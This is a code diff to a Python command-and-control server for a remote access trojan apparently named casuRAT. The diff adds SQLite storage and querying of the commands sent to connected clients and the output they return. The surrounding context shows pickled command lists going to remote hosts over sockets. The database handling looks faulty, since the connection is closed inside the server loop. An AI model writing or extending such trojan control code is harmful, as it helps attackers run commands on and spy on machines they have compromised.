@@ -5,6 +5,7 @@ import sys
 import socket
 import time
 import pickle
+import sqlite3
 
 
 if len(sys.argv) != 3:
@@ -17,6 +18,8 @@ lserver = (lhost, lport)
 dill_refuse = pickle.dumps("refused")
 cmd_list = []
 cmd_list2 = []
+dbconn = sqlite3.connect('casuRAT.db')
+c = dbconn.cursor()
 
 
 def take_cmds():
@@ -67,6 +70,8 @@ def take_cmds2():
 
 def send_cmd(caddr, clist):
 # Send the appropriate command list after pickleing it.
+        global sent_list
+        sent_list = "".join(clist)
         print('Connection from', caddr, "\n")
         dill_cmd = pickle.dumps(clist)
         conn.send(dill_cmd)
@@ -94,9 +99,18 @@ def return_cmds(sock, raddr, timeout=2):
             except:
                 pass
         print(total_output)
+        utctime = time.asctime(time.gmtime())
+        sql_push = (str(addr), str(utctime), str(sent_list), str(total_output))
+        c.execute('INSERT INTO HISTORY VALUES (?,?,?,?)', sql_push)
         with open('casulog.txt','a') as log:
             log.write(total_output)      
             return
+
+
+query_ask = input("Would you like to query the command history (y/n)?: ")
+if query_ask.lower() in ['y', 'yes']:
+    for row in c.execute('SELECT * FROM HISTORY ORDER BY utc_time'):
+        print(row)
 
 
 take_cmds()
@@ -139,6 +153,8 @@ while True:
             else:
                 print(addr[0], "tried to connect, but was not", cmd_list2[0])
 # Send a string to client resetting hanging, then reset the server socket.
+    dbconn.commit()
+    dbconn.close()
     conn.send(dill_refuse)
     s.close()
     s = None
